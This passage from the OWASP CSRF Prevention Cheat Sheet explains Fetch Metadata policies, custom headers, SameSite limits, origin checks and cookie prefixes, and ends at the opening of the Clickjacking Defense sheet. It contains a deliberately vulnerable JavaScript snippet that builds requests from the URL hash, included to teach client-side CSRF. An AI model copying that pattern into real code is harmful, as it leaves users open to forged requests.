For the rare cases of outdated or embedded browsers that lack `Sec-Fetch-*` support, a fallback to [standard origin verification](#using-standard-headers-to-verify-origin) should provide the required coverage. If this is acceptable for your project, consider prompting users to update their browsers, as they are running on outdated and potentially insecure versions.

#### How to treat Fetch Metadata headers on the server-side

`Sec-Fetch-Site` is the most useful Fetch Metadata header for blocking CSRF-like cross-origin requests and should be the primary signal in a Fetch-Metadata-based policy. Use other Fetch Metadata headers (`Sec-Fetch-Mode`, `Sec-Fetch-Dest`, `Sec-Fetch-User`) to further refine or tailor policies to your application's needs (for example, allowing top-level navigation requests or permitting specific Dest values for resource endpoints).
**Policy (high level)**

1. If `Sec-Fetch-Site` is present

   1.1. Treat cross-site as untrusted for state-changing actions. By default, reject non-safe methods (POST / PUT / PATCH / DELETE) when `Sec-Fetch-Site: cross-site`.

   ```JavaScript
   const SAFE_METHODS = new Set(['GET','HEAD','OPTIONS']);
   const site = req.get('Sec-Fetch-Site'); // e.g. 'cross-site','same-site','same-origin','none'

   if (site === 'cross-site' && !SAFE_METHODS.has(req.method)) {
     return false; // forbid this request
   }
   ```

   1.2 If your application relies on [safe HTTP methods](https://developer.mozilla.org/en-US/docs/Glossary/Safe/HTTP) (GET, HEAD, or OPTIONS) for state‑changing actions, you should explicitly reflect that in your policy – e.g., by requiring a Fetch‑Metadata header review for requests to those endpoints. This can be enforced with a policy rule like:

   ```JavaScript
   const SAFE_METHODS = new Set(['GET','HEAD','OPTIONS']);
   const SENSITIVE_ENDPOINTS = new Set([
     '/user/profile',
     '/account/details',
   ]);

   const site = req.get('Sec-Fetch-Site');
   const path = req.path;

   // Block if cross-site + unsafe method OR cross-site + sensitive endpoint
   if (site === 'cross-site' && (!SAFE_METHODS.has(req.method) || SENSITIVE_ENDPOINTS.has(path))) {
     return false; // forbid this request
   }
   ```

   1.3. Allow `same-origin`. Treat `same-site` as allowed only if your threat model trusts sibling subdomains; otherwise handle `same-site` conservatively (for example, require additional validation).

   ```JavaScript
   const trustSameSite = false; // set true only if you trust sibling subdomains

   if (site === 'same-origin') {
     return true;
   } else if (site === 'same-site') {
     // handle same-site separately so the subcondition is clearly scoped to same-site
     if (!trustSameSite && !SAFE_METHODS.has(req.method)) {
       return false; // treat same-site as untrusted for state-changing methods
     }
     return true;
   }
   ```

   1.4. Allow none for user-driven top-level navigations (bookmarks, typed URLs, explicit form submits) where appropriate.

2. If `Sec-Fetch-*` headers are absent: choose a fallback based on risk and compatibility requirements:
    2.1. Fail-safe (recommended for sensitive endpoints): treat absence as unknown and block the request.
    2.2. Fail-open (compatibility-first): fallback to ([standard origin verification](#using-standard-headers-to-verify-origin), CSRF tokens, and/or require additional validation).

3. Additional options

   3.1 To ensure that your site can still be linked from other sites, you have to allow simple (HTTP GET) top-level navigation.

   ```JavaScript
   if (req.get('Sec-Fetch-Mode') === 'navigate' &&
       req.method === 'GET' &&
       req.get('Sec-Fetch-Dest') !== 'object' &&
       req.get('Sec-Fetch-Dest') !== 'embed') {
     return true; // Allow this request
   }
   ```

   3.2 Whitelist explicit cross-origin flows. If certain endpoints intentionally accept cross-origin requests (CORS JSON APIs, third-party integrations, webhooks), explicitly exempt those endpoints from the global Sec-Fetch deny policy and secure them with proper CORS configuration, authentication, and logging.

#### Requirements

- Your application must be served over trustworthy URLs. Fetch Metadata request headers are only sent to [potentially trustworthy URLs](https://www.w3.org/TR/secure-contexts/#is-url-trustworthy). In practice, this includes `https`, `wss`, `file`, and `localhost` (including `127.0.0.0/8` and `::1/128`). See the [W3C Secure Contexts spec](https://www.w3.org/TR/secure-contexts/#is-origin-trustworthy) for full details.
- HTTPS must be enforced across the entire application. This ensures consistent inclusion of Fetch Metadata headers. Enabling [HTTP Strict Transport Security (HSTS)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Strict-Transport-Security) helps achieve this by automatically upgrading all HTTP requests to HTTPS.
- [Safe HTTP methods](https://developer.mozilla.org/en-US/docs/Glossary/Safe/HTTP) should not be used for state-changing requests.

#### Concerns

- Prerender/prefetch and other [speculative navigation](https://developer.mozilla.org/en-US/docs/Web/Performance/Guides/Speculative_loading) may send `Sec-Fetch-*` values that don’t match the final navigation, and browser-initiated flows (e.g., [PaymentRequest](https://developer.mozilla.org/en-US/docs/Web/API/Payment_Request_API)) could generate requests without predictable fetch-metadata headers. These behaviors are still being refined, so header propagation isn’t fully stable across all navigation types.
- Intermediaries (proxies, gateways, load balancers) may remove or modify `Origin` and `Sec-*` headers — whether due to privacy filters, network optimizations, or simple misconfiguration — which can break fetch-metadata-based protections. This kind of header stripping is problematic, but common.

#### Rollout & testing recommendations

- Include an appropriate `Vary` header, in order to ensure that caches handle the response appropriately. For example, `Vary: Sec-Fetch-Site, Origin`. See more [Fetch Metadata specification](https://w3c.github.io/webappsec-fetch-metadata/#vary).
    - Note that the `Vary` header does not impact CSRF defenses in any way. It is a response header, so it is applied after the server has already made its allow/deny decision based on CSRF protections. Its purpose is operational rather than defensive.
    - If the server responds differently based on HTTP headers (e.g., `Sec-Fetch-Site`, `Origin`), caches must vary on those headers. Without this, CDNs or proxies may reuse a response generated for a different context, causing broken behavior or contributing to cache-poisoning scenarios. Adding the appropriate `Vary` header ensures caches keep these responses separate.
- Start in “log only” mode. Record requests that would be blocked and review for false positives before enforcing. This is the safest way to discover legitimate flows that need whitelisting.
- Monitor UA coverage. Track which user agents include `Sec-Fetch-*` and which don’t; ensure your fallback logic covers missing-header cases. Use metrics to decide when to enforce stricter policies.
- Document exceptions. Keep an explicit list of endpoints whitelisted for cross-origin access.

### Disallowing simple requests

When a `<form>` tag is used to submit data, it sends a ["simple" request](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple_requests) that browsers do not designate as "to be preflighted". These "simple" requests introduce risk of CSRF because browsers permit them to be sent to any origin. If your application uses `<form>` tags to submit data anywhere in your client, you will still need to protect them with alternate approaches described in this document such as tokens.

> **Caveat:**
Should a browser bug allow custom HTTP headers, or not enforce preflight on non-simple content types, it could compromise your security. Although unlikely, it is prudent to consider this in your threat model. Implementing CSRF tokens adds additional layer of defense and gives developers more control over security of the application.

#### Disallowing simple content types

For a request to be deemed simple, it must have one of the following content types - `application/x-www-form-urlencoded`, `multipart/form-data` or `text/plain`.  Many modern web applications use JSON APIs so would naturally require CORS, however they may accept `text/plain` which would be vulnerable to CSRF. Therefore a simple mitigation is for the server or API to disallow these simple content types.

#### Employing Custom Request Headers for AJAX/API

Both the synchronizer token and the double-submit cookie are used to prevent forgery of form data, but they can be tricky to implement and degrade usability. Many modern web applications do not use `<form>` tags to submit data. A user-friendly defense that is particularly well suited for AJAX or API endpoints is the use of a **custom request header**. No token is needed for this approach.

In this pattern, the client appends a custom header to requests that require CSRF protection. The header can be any arbitrary key-value pair, as long as it does not conflict with existing headers.

```
X-CSRF-Token: RANDOM-TOKEN-VALUE
```

Many popular frameworks use standardized header names for CSRF protection:

- `X-CSRF-Token` - Ruby on Rails, Laravel, Django
- `X-XSRF-Token` - AngularJS
- `CSRF-Token` - Express.js (csurf middleware)
- `X-CSRFToken` - Django

While any arbitrary header name will work, using one of these standard names can improve compatibility with existing tools and developer expectations.

When handling the request, the API checks for the existence of this header. If the header does not exist, the backend rejects the request as potential forgery. This approach has several advantages:

- UI changes are not required
- no server state is introduced to track tokens

This defense relies on the CORS preflight mechanism which sends an `OPTIONS` request to verify CORS compliance with the destination server. All modern browsers designate requests with custom headers as "to be preflighted". When the API verifies that the custom header is there, you know that the request must have been preflighted if it came from a browser.

##### Custom Headers and CORS

Cookies are not set on cross-origin requests (CORS) by default. To enable cookies on an API, you will set `Access-Control-Allow-Credentials=true`. The browser will reject any response that includes `Access-Control-Allow-Origin=*` if credentials are allowed. To allow CORS requests, but protect against CSRF, you need to make sure the server only allows a few select origins that you definitively control via the `Access-Control-Allow-Origin` header. Any cross-origin request from an allowed domain will be able to set custom headers.

As an example, you might configure your backend to allow CORS with cookies from `http://www.yoursite.com` and `http://mobile.yoursite.com`, so that the only possible preflight responses are:

```
Access-Control-Allow-Origin=http://mobile.yoursite.com
Access-Control-Allow-Credentials=true
```

or

```
Access-Control-Allow-Origin=http://www.yoursite.com
Access-Control-Allow-Credentials=true
```

A less secure configuration would be to configure your backend server to allow CORS from all subdomains of your site using a regular expression. If an attacker is able to [take over a subdomain](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/10-Test_for_Subdomain_Takeover) (not uncommon with cloud services) your CORS configuration would allow them to bypass the same origin policy and forge a request with your custom header.

### Dealing with Client-Side CSRF Attacks (IMPORTANT)

[Client-side CSRF](https://soheilkhodayari.github.io/same-site-wiki/docs/attacks/csrf.html#client-side-csrf) is a new variant of CSRF attacks where the attacker tricks the client-side JavaScript code to send a forged HTTP request to a vulnerable target site by manipulating the program's input parameters. Client-side CSRF originates when the JavaScript program uses attacker-controlled inputs, such as the URL, for the generation of asynchronous HTTP requests.

**Note:** These variants of CSRF are particularly important as they can bypass some of the common anti-CSRF countermeasures like [token-based mitigations](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#token-based-mitigation) and [SameSite cookies](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#samesite-cookie-attribute). For example, when [synchronizer tokens](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#synchronizer-token-pattern) or [custom HTTP request headers](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html#use-of-custom-request-headers) are used, the JavaScript program will include them in the asynchronous requests. Also, web browsers will include cookies in same-site request contexts initiated by JavaScript programs, circumventing the [SameSite cookie policies](https://soheilkhodayari.github.io/same-site-wiki/docs/policies/overview.html).

**Client-Side vs. Classical CSRF:** In the classical CSRF model, the server-side program is the most vulnerable component, because it cannot distinguish whether the incoming authenticated request was performed **intentionally**, also known as the confused deputy problem. In the client-side CSR model, the most vulnerable component is the client-side JavaScript program because an attacker can use it to generate arbitrary asynchronous requests by manipulating the request endpoint and/or its parameters. Client-side CSRF is due to an input validation problem and it reintroduces the confused deputy flaw, that is, the server-side won't, again, be able to distinguish if the request was performed intentionally or not.

For more information about client-side CSRF vulnerabilities, see Sections 2 and 5 of this [paper](https://www.usenix.org/system/files/sec21-khodayari.pdf), the [CSRF chapter](https://soheilkhodayari.github.io/same-site-wiki/docs/attacks/csrf.html) of the [SameSite wiki](https://soheilkhodayari.github.io/same-site-wiki), and [this post](https://www.facebook.com/notes/facebook-bug-bounty/client-side-csrf/2056804174333798/) by the [Meta Bug Bounty Program](https://www.facebook.com/whitehat).

#### Client-side CSRF Example

The following code snippet demonstrates a simple example of a client-side CSRF vulnerability.

```html
<script type="text/javascript">
    const csrf_token = document.querySelector("meta[name='csrf-token']").getAttribute("content");

    const ajaxLoad = () => {
        // process the URL hash fragment
        const hashFragment = window.location.hash.slice(1);

        // hash fragment should be of the format: /^(get|post);(.*)$/
        // e.g., https://site.com/index/#post;/profile
        if (hashFragment.length > 0 && hashFragment.includes(';')) {
            const params = hashFragment.match(/^(get|post);(.*)$/);

            if (params && params.length) {
                const requestMethod = params[1];
                const requestEndpoint = params[2];

                fetch(requestEndpoint, {
                    method: requestMethod,
                    headers: {
                        'X-CSRF-Token': csrf_token,
                        // [...]
                    },
                    // [...]
                })
                .then(response => { /* [...] */ })
                .catch(error => console.error('Request failed:', error));
            }
        }
    };

    // trigger the async request on page load - better practice is to use event listeners
    window.addEventListener('DOMContentLoaded', ajaxLoad);
</script>
```

**Vulnerability:** In this snippet, the program invokes a function `ajaxLoad()` upon the page load, which is responsible for loading various webpage elements. The function reads the value of the [URL hash fragment](https://developer.mozilla.org/en-US/docs/Web/API/Location/hash) (line 4), and extracts two pieces of information from it (i.e., request method and endpoint) to generate an asynchronous HTTP request (lines 11-13). The vulnerability occurs in lines 15-22, when the JavaScript program uses URL fragments to obtain the server-side endpoint for the asynchronous HTTP request (line 15) and the request method. However, both inputs can be controlled by web attackers, who can pick the value of their choosing, and craft a malicious URL containing the attack payload.

**Attack:** Usually, attackers share a malicious URL with the victim (through elements such as spear-phishing emails) and because the malicious URL appears to be from an honest, reputable (but vulnerable) website, the user often clicks on it. Alternatively, the attackers can create an attack page to abuse browser APIs (e.g., the [`window.open()`](https://developer.mozilla.org/en-US/docs/Web/API/Window/open) API) and trick the vulnerable JavaScript of the target page to send the HTTP request, which closely resembles the attack model of the classical CSRF attacks.

For more examples of client-side CSRF, see [this post](https://www.facebook.com/notes/facebook-bug-bounty/client-side-csrf/2056804174333798/) by the [Meta Bug Bounty Program](https://www.facebook.com/whitehat) and this USENIX Security [paper](https://www.usenix.org/system/files/sec21-khodayari.pdf).

#### Client-side CSRF Mitigation Techniques

**Independent Requests:** Client-side CSRF can be prevented when asynchronous requests cannot be generated via attacker controllable inputs, such as the [URL](https://developer.mozilla.org/en-US/docs/Web/API/Window/location), [window name](https://developer.mozilla.org/en-US/docs/Web/API/Window/name), [document referrer](https://developer.mozilla.org/en-US/docs/Web/API/Document/referrer), and [postMessages](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage), to name only a few examples.

**Input Validation:** Achieving complete isolation between inputs and request parameters may not always be possible depending on the context and functionality. In these cases, input validation checks has to be implemented. These checks should strictly assess the format and choice of the values of the request parameters and decide whether they can only be used in non-state-changing operations (e.g., only allow GET requests and endpoints starting with a predefined prefix).

**Predefined Request Data:** Another mitigation technique is to store a list of predefined, safe request data in the JavaScript code (e.g., combinations of endpoints, request methods and other parameters that are safe to be replayed). The program can then use a switch parameter in the URL fragment to decide which entry of the list should each JavaScript function use.

### Defense In Depth Techniques

#### SameSite (Cookie Attribute)

SameSite is a cookie attribute (similar to HTTPOnly, Secure etc.) which aims to mitigate CSRF attacks. It is defined in [RFC6265bis](https://tools.ietf.org/html/draft-ietf-httpbis-rfc6265bis-02#section-5.3.7). This attribute helps the browser decide whether to send cookies along with cross-site requests. Possible values for this attribute are `Lax`, `Strict`, or `None`.

The Strict value will prevent the cookie from being sent by the browser to the target site in all cross-site browsing context, even when following a regular link. For example, if a GitHub-like website uses the Strict value, a logged-in GitHub user who tries to follow a link to a private GitHub project posted on a corporate discussion forum or email, the user will not be able to access the project because GitHub will not receive a session cookie. Since a bank website would not allow any transactional pages to be linked from external sites, so the Strict flag would be most appropriate for banks.

If a website wants to maintain a user's logged-in session after the user arrives from an external link, SameSite's default Lax value provides a reasonable balance between security and usability. If the GitHub scenario above uses a Lax value instead, the session cookie would be allowed when following a regular link from an external website while blocking it in CSRF-prone request methods such as POST. Only cross-site-requests that are allowed in Lax mode have top-level navigations and use [safe](https://tools.ietf.org/html/rfc7231#section-4.2.1) HTTP methods.

For more details on the `SameSite` values, check the following [section](https://tools.ietf.org/html/draft-ietf-httpbis-rfc6265bis-02#section-5.3.7.1) from the [rfc](https://tools.ietf.org/html/draft-ietf-httpbis-rfc6265bis-02).

Example of cookies using this attribute:

```text
Set-Cookie: JSESSIONID=xxxxx; SameSite=Strict
Set-Cookie: JSESSIONID=xxxxx; SameSite=Lax
```

All modern desktop and mobile browsers support the `SameSite` attribute. The main exceptions are legacy browsers including Opera Mini (all versions), UC Browser for Android, and older mobile browsers (iOS Safari < 13.2, Android Browser < 97). To track the browsers implementing it and know how the attribute is used, refer to the following [service](https://caniuse.com/#feat=same-site-cookie-attribute). Chrome implemented `SameSite=Lax` as the default behavior in 2020, and Firefox and Edge have followed suit. Additionally, the `Secure` flag is required for cookies that are marked as `SameSite=None`.

##### Limitations of SameSite

`SameSite` is useful as a defense-in-depth control but it does not replace a proper CSRF defense in most deployments. Treat the following as known gaps when reasoning about how much protection it actually provides:

- **`Lax` only blocks unsafe methods.** The default `Lax` behavior still allows the cookie on top-level navigations that use [safe methods](https://tools.ietf.org/html/rfc7231#section-4.2.1) (`GET`, `HEAD`, `OPTIONS`, `TRACE`). If any state-changing operation in the application is reachable via a `GET` request, `SameSite=Lax` will not stop it. This is the single most common way `SameSite`-based defenses fail in practice. Review every `GET` endpoint and ensure that none of them mutate server-side state.
- **`SameSite` is scoped to the registrable domain, not the origin.** A cookie set on `app.example.com` with any `SameSite` value is still considered "same-site" when the request originates from `anything.example.com`. If your application shares a registrable domain with content you do not fully control (multi-tenant SaaS on a shared parent domain, subdomain-hosted user content, legacy subdomains, an acquired product running on the same parent domain, third-party services on subdomains), a vulnerability or malicious actor on any of those sibling hosts can issue requests that the browser will treat as same-site. This also amplifies the impact of [subdomain takeovers](https://cheatsheetseries.owasp.org/cheatsheets/Subdomain_Takeover_Prevention_Cheat_Sheet.html): an attacker who claims a dangling subdomain can issue requests that your `SameSite`-protected cookies will accompany.
- **Top-level navigation and window-opening tricks.** An attacker who can get a victim to perform a top-level navigation or open a new window targeting your site (including through prerendering hints, `window.open`, or clicking a crafted link) can generate a request the browser treats as same-site. `SameSite=Strict` blocks most of these at the cost of breaking legitimate cross-site links into the app.
- **Browser coverage is not universal.** While current mainstream browsers enforce `SameSite=Lax` by default, users on older browsers, embedded browsers, or non-mainstream clients may receive cookies that behave as if no `SameSite` value were set. Do not assume all traffic enjoys the protection.
- **Client-side CSRF is unaffected.** `SameSite` operates on cross-site requests. It does not protect against client-side CSRF (see the earlier section on _Dealing with Client-Side CSRF Attacks_) where malicious input causes same-origin JavaScript in your own application to issue a state-changing request.

###### When SameSite May Be Sufficient On Its Own

In narrow deployments `SameSite` alone can provide a reasonable CSRF defense, provided every one of the following holds:

- The application does not share a registrable domain with any host, subdomain, or service you do not fully control.
- No `GET` (or other safe-method) endpoint in the application performs a state-changing action. All state changes require `POST`, `PUT`, `PATCH`, or `DELETE`.
- The session cookie is set with `SameSite=Strict`, or `SameSite=Lax` combined with the `__Host-` prefix and a strict audit of every `GET` handler.
- Origin or Referer verification (see below) is in place for defense in depth on state-changing endpoints.
- You are comfortable excluding users whose browsers do not enforce `SameSite`, or you accept the residual risk that those users face.

For any application that does not meet all of the above, `SameSite` should be treated as a defense-in-depth layer and combined with a CSRF token or a double-submit pattern rather than relied on alone.

#### Using Standard Headers to Verify Origin

There are two steps to this mitigation method, both of which examine an HTTP request header value:

1. Determine the origin that the request is coming from (source origin). Can be done via Origin or Referer headers.
2. Determining the origin that the request is going to (target origin).

At server-side, we verify if both of them match. If they do, we accept the request as legitimate (meaning it's the same origin request) and if they don't, we discard the request (meaning that the request originated from cross-domain). Reliability on these headers comes from the fact that they cannot be altered programmatically as they fall under [forbidden headers](https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name) list, meaning that only the browser can set them.

##### Identifying Source Origin (via Origin/Referer Header)

###### Checking the Origin Header

If the Origin header is present, verify that its value matches the target origin. HTTPS alone does not guarantee that the header is present; the [Fetch Standard conditions its inclusion on the request context and method](https://fetch.spec.whatwg.org/#append-a-request-origin-header).

###### Checking the Referer Header if Origin Header Is Not Present

If the Origin header is not present, verify that the hostname in the Referer header matches the target origin. This method of CSRF mitigation is also commonly used with unauthenticated requests, such as requests made prior to establishing a session state, which is required to keep track of a synchronization token.

In both cases, make sure the target origin check is strong. For example, if your site is `example.org` make sure `example.org.attacker.com` does not pass your origin check (i.e, match through the trailing / after the origin to make sure you are matching against the entire origin).

If neither header establishes a trusted source origin, reject the protected state-changing request unless another configured CSRF defense, such as a valid CSRF token, succeeds. Missing headers and `Origin: null` are not evidence of a same-origin request.

##### Identifying the Target Origin

Generally, it's not always easy to determine the target origin. You are not always able to simply grab the target origin (i.e., its hostname and port `#`) from the URL in the request, because the application server is frequently sitting behind one or more proxies. This means that the original URL can be different from the URL the app server actually receives. However, if your application server is directly accessed by its users, then using the origin in the URL is fine and you're all set.

If you are behind a proxy, there are a number of options to consider.

- **Configure your application to simply know its target origin:** Since it is your application, you can find its target origin and set that value in some server configuration entry. This would be the most secure approach as its defined server side, so it is a trusted value. However, this might be problematic to maintain if your application is deployed in many places, e.g., dev, test, QA, production, and possibly multiple production instances. Setting the correct value for each of these situations might be difficult, but if you can do it via some central configuration and provide your instances the ability to grab the value from it, that's great! (**Note:** Make sure the centralized configuration store is maintained securely because major part of your CSRF defense depends on it.)
- **Use the Host header value:** If you want your application to find its own target so it doesn't have to be configured for each deployed instance, we recommend using the Host family of headers. The Host header is meant to contain the target origin of the request. But, if your app server is sitting behind a proxy, the Host header value is most likely changed by the proxy to the target origin of the URL behind the proxy, which is different than the original URL. This modified Host header origin won't match the source origin in the original Origin or Referer headers.
- **Use the X-Forwarded-Host header value only from trusted proxies:** A reverse proxy can preserve the original host in this header. Configure the application to trust only known proxy connections, and ensure the trusted proxy removes or overwrites client-supplied forwarded headers, as described in the [Express proxy guidance](https://expressjs.com/en/guide/behind-proxies/). Do not trust the header merely because it is present. Validate this configuration on every ingress path, including any direct access to the application server.

A target origin derived from proxy headers is trustworthy only when these proxy requirements are met; source-origin validation still requires the Origin or Referer header. Though these headers are included the **majority** of the time, there are few use cases where they are not included (most of them are for legitimate reasons to safeguard users privacy/to tune to browsers ecosystem).

**Cases where source-origin information is unavailable:**

- [Cross-origin redirects can produce `Origin: null`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Origin#description).
- Opaque origins, including sandboxed iframes without `allow-same-origin`, can also produce `Origin: null`. An attacker can create such a context, so do not allowlist the literal `null` value.
- Header inclusion depends on request context and method. For example, cross-origin `GET` or `HEAD` requests in `no-cors` mode can omit `Origin`. Keep safe methods free of state changes.
- Referer header is no exception. There are multiple use cases where referrer header is omitted as well ([1](https://stackoverflow.com/questions/6880659/in-what-cases-will-http-referer-be-empty), [2](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer), [3](https://en.wikipedia.org/wiki/HTTP_referer#Referer_hiding), [4](https://seclab.stanford.edu/websec/csrf/csrf.pdf) and [5](https://www.google.com/search?q=referrer+header+sent+null+value+site:stackoverflow.com)). Load balancers, proxies and embedded network devices are also well known to strip the referrer header due to privacy reasons in logging them.

Review legitimate requests that lack usable origin information and provide an explicit fallback, such as [server-validated CSRF tokens](#token-based-mitigation). Do not bypass CSRF validation merely to preserve compatibility with missing or `null` source origins.

##### Using Cookies with Host Prefixes to Identify Origins

While the `SameSite` and `Secure` attributes mentioned earlier restrict the sending of already set cookies
and `HttpOnly` restricts the reading of a set cookie,
an attacker may still try to inject or overwrite otherwise secured cookies
(cf. [session fixation attacks](http://www.acrossecurity.com/papers/session_fixation.pdf)).
Using `Cookie Prefixes` for cookies with CSRF tokens extends security protections against this kind of attacks as well.
If cookies have `__Host-` prefixes e.g. `Set-Cookie: __Host-token=RANDOM; path=/; Secure` then each cookie:

- Cannot be (over)written from another subdomain and
- cannot have a `Domain` attribute.
- Must have the path of `/`.
- Must be marked as Secure (i.e, cannot be sent over unencrypted HTTP).

In addition to the `__Host-` prefix, the weaker `__Secure-` prefix is also supported by browser vendors.
It relaxes the restrictions on domain overwrites, i.e., they

- Can have `Domain` attributes and
- can be overwritten by subdomains.
- Can have a `Path` other than `/`.

This relaxed variant can be used as an alternative to the "domain locked" `__Host-` prefix,
if authenticated users would need to visit different (sub-)domains.
In all other cases, using the `__Host-` prefix in addition to the `SameSite` attribute is recommended.

Cookie prefixes [are supported by all major browsers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Browser_compatibility).

See the [Mozilla Developer Network](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Directives) and [IETF Draft](https://tools.ietf.org/html/draft-west-cookie-prefixes-05) for further information about cookie prefixes.

#### User Interaction-Based CSRF Defense

While all the techniques referenced here do not require any user interaction, sometimes it's easier or more appropriate to involve the user in the transaction to prevent unauthorized operations (forged via CSRF or otherwise). The following are some examples of techniques that can act as strong CSRF defense when implemented correctly.

- Re-Authentication mechanisms
- One-time Tokens

Do NOT use CAPTCHA because it is specifically designed to protect against bots. It is possible, and still valid in some implementations of CAPTCHA, to obtain proof of human interaction/presence from a different user session. Although this makes the CSRF exploit more complex, it does not protect against it.

While these are very strong CSRF defenses, it can create a significant impact on the user experience. As such, they would generally only be used for security critical operations (such as password changes, money transfers, etc.), alongside the other defenses discussed in this cheat sheet.

### Possible CSRF Vulnerabilities in Login Forms

Most developers tend to ignore CSRF vulnerabilities on login forms as they assume that CSRF would not be applicable on login forms because user is not authenticated at that stage, however this assumption is not always true. CSRF vulnerabilities can still occur on login forms where the user is not authenticated, but the impact and risk is different.

For example, if an attacker uses CSRF to assume an authenticated identity of a target victim on a shopping website using the attacker's account, and the victim then enters their credit card information, an attacker may be able to purchase items using the victim's stored card details. For more information about login CSRF and other risks, see section 3 of [this](https://seclab.stanford.edu/websec/csrf/csrf.pdf) paper.

Login CSRF can be mitigated by creating pre-sessions (sessions before a user is authenticated) and including tokens in login form. You can use any of the techniques mentioned above to generate tokens. Remember that pre-sessions cannot be transitioned to real sessions once the user is authenticated - the session should be destroyed and a new one should be made to avoid [session fixation attacks](http://www.acrossecurity.com/papers/session_fixation.pdf). This technique is described in [Robust Defenses for Cross-Site Request Forgery section 4.1](https://seclab.stanford.edu/websec/csrf/csrf.pdf). Login CSRF can also be mitigated by including a custom request headers in AJAX request as described [above](#employing-custom-request-headers-for-ajaxapi).

### REFERENCE: Sample JEE Filter Demonstrating CSRF Protection

The following [JEE web filter](https://github.com/righettod/poc-csrf/blob/master/src/main/java/eu/righettod/poccsrf/filter/CSRFValidationFilter.java) provides an example reference for some of the concepts described in this cheatsheet. It implements the following stateless mitigations ([OWASP CSRFGuard](https://github.com/aramrami/OWASP-CSRFGuard), cover a stateful approach).

- Verifying same origin with standard headers
- Double submit cookie
- SameSite cookie attribute

**Please note** that this is only a reference sample and is not complete (for example: it doesn't have a block to direct the control flow when origin and referrer header check succeeds nor it has a port/host/protocol level validation for referrer header). Developers are recommended to build their complete mitigation on top of this reference sample. Developers should also implement authentication and authorization mechanisms before checking for CSRF is considered effective.

Full source is located [here](https://github.com/righettod/poc-csrf) and provides a runnable POC.

### JavaScript: Automatically Including CSRF Tokens as an AJAX Request Header

Prefer your HTTP client's maintained CSRF integration over global request overrides. For example, [Angular limits its built-in XSRF header to mutating requests to relative and same-origin URLs](https://angular.dev/best-practices/security#httpclient-xsrf-csrf-security). Attach tokens only to the application endpoints that validate them; sending a token to an unrelated origin can disclose it to that server if its CORS policy permits the request.

Keep `GET`, `HEAD`, and `OPTIONS` free of state changes. The server must validate the token on every protected state-changing request; adding a client header alone does not enforce CSRF protection.

#### Storing the CSRF Token Value in the DOM

For the [synchronizer token pattern](#synchronizer-token-pattern), the server can include the token in the page, such as a `<meta>` element, and the client can read it when constructing protected requests. Use your template's attribute encoder when rendering the value. Do not put tokens in URLs or logs.

For a cookie-to-header integration, configure the server to issue and validate the token according to the [Signed Double-Submit Cookie pattern](#signed-double-submit-cookie-recommended). The token cookie must be readable by the client, while the authentication cookie should remain `HttpOnly`.

#### Overriding Defaults to Set Custom Header

Restrict token attachment by the origin of the resolved request URL, not just its HTTP method or a presumed `baseURL`. Cross-origin API integrations need an explicit list of trusted destinations and a matching server-side CSRF policy. [CORS preflight does not keep a manually attached token secret from a destination that allows the request](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CORS#preflighted_requests).

##### XMLHttpRequest (Native JavaScript)

Set the CSRF header when constructing a request to a protected application endpoint. Avoid replacing `XMLHttpRequest.prototype.open` globally: unrelated requests also use it and could receive the token.

##### CSRF Prevention in modern Frameworks

Client frameworks do not replace server-side CSRF validation. Use a maintained HTTP client integration and verify which request destinations receive the token.

##### Angular

Use [Angular's `HttpClient` XSRF integration](https://angular.dev/best-practices/security#httpclient-xsrf-csrf-security), and configure the backend to issue the token cookie and validate the matching header. Keep its restriction to relative and same-origin destinations. Use `withXsrfConfiguration` when the server uses different cookie or header names.

##### React

React applications need an HTTP client and matching server-side CSRF protection. For Axios clients, use the configuration described below rather than an interceptor that adds the token to every mutating request.

##### Axios

Use Axios's maintained XSRF cookie-to-header support with cookie and header names that match the backend. Its [`withXSRFToken` default attaches the header only to same-origin requests](https://axios.rest/pages/advanced/request-config#withxsrftoken). Do not enable token attachment to every cross-origin destination or put the token in global method defaults.

##### jQuery

If using `beforeSend` to attach the token, limit it to protected state-changing requests to the same origin. Keep the destination check as well as the method check.

#### TypeScript Utilities for CSRF Protection

TypeScript types do not enforce a CSRF trust boundary. Use the same destination restrictions and server validation as other JavaScript clients; avoid maintaining separate generic token parsers and request wrappers solely for each framework.

##### Angular with TypeScript

Use Angular's built-in integration described above instead of a custom interceptor that sends a token to every destination.

##### React with TypeScript

Use a maintained HTTP client integration as described above. If the application uses `fetch` directly, attach the token only after validating that the resolved URL targets an explicitly trusted application endpoint. Test relative URLs, absolute URLs, and rejected external destinations.

## Clickjacking Defense

> **Source:** [Clickjacking Defense](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html) · [OWASP Cheat Sheet Series](https://github.com/OWASP/CheatSheetSeries), CC BY-SA 4.0

### Introduction

This cheat sheet is intended to provide guidance for developers on how to defend against [Clickjacking](https://owasp.org/www-community/attacks/Clickjacking), also known as UI redress attacks.

There are three main mechanisms that can be used to defend against these attacks:

- Preventing the browser from loading the page in frame using the [X-Frame-Options](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options) or [Content Security Policy (frame-ancestors)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors) HTTP headers.
- Preventing session cookies from being included in cross-site iframe requests using the [SameSite](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie#samesitesamesite-value) cookie attribute.
